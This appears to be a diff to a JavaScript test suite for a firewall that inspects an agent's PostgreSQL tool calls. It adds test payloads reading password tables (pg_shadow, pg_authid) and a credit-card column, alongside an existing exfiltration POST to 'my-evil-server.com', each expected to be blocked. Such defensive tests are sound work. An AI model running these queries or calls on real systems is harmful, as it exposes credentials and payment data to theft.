@@ -282,6 +282,24 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
       category: 'Strict Egress Firewall Violation (Arbitrary Domain)',
       payload: 'POST https://my-evil-server.com/exfil',
       expectedRule: 'EGRESS_FIREWALL_VIOLATION'
+    },
+    {
+      id: 46,
+      category: 'PostgreSQL pg_shadow System Table Block',
+      payload: 'SELECT * FROM pg_shadow',
+      expectedRule: 'SENSITIVE_CREDENTIAL_TABLE_BLOCKED'
+    },
+    {
+      id: 47,
+      category: 'Credit Card Number Column DLP Extraction Block',
+      payload: 'SELECT credit_card_number FROM payments',
+      expectedRule: 'DLP_SENSITIVE_COLUMN_EXTRACTION_BLOCKED'
+    },
+    {
+      id: 48,
+      category: 'PostgreSQL pg_authid / pg_roles System Table Block',
+      payload: 'SELECT * FROM pg_authid',
+      expectedRule: 'SENSITIVE_CREDENTIAL_TABLE_BLOCKED'
     }
   ];
 
@@ -295,7 +313,7 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
     });
   }
 
-  await t.test('Vector #46 [In-Place Unicode & Zero-Width Sanitization]: Injected U+200B and U+202E characters MUST be stripped from returned payload', () => {
+  await t.test('Vector #49 [In-Place Unicode & Zero-Width Sanitization]: Injected U+200B and U+202E characters MUST be stripped from returned payload', () => {
     const dirtyPayload = { query: 'SELECT id,\u200B name\u202E FROM users WHERE active = true' };
     const res = waf.inspectToolCall('postgres_query', dirtyPayload);
 
@@ -305,7 +323,7 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
     assert.ok(!res.sanitizedPayload.query.includes('\u202E'), 'Failed to strip U+202E RTL override character!');
   });
 
-  await t.test('Vector #47 [Legitimate Safe Query]: Should permit and cryptographically sign valid read queries', () => {
+  await t.test('Vector #50 [Legitimate Safe Query]: Should permit and cryptographically sign valid read queries', () => {
     const safePayload = { query: 'SELECT id, name, created_at FROM organizations WHERE plan = "enterprise" LIMIT 20;' };
     const res = waf.inspectToolCall('postgres_query', safePayload);
 
@@ -316,7 +334,7 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
     assert.ok(res.publicKey);
   });
 
-  await t.test('Vector #48 [Ed25519 Canonical Specification & Mathematical Verification]: Anyone can independently verify the signature against the published canonical format', () => {
+  await t.test('Vector #51 [Ed25519 Canonical Specification & Mathematical Verification]: Anyone can independently verify the signature against the published canonical format', () => {
     const payload = { query: 'SELECT * FROM users WHERE active = true' };
     const res = waf.inspectToolCall('postgres_query', payload);
 
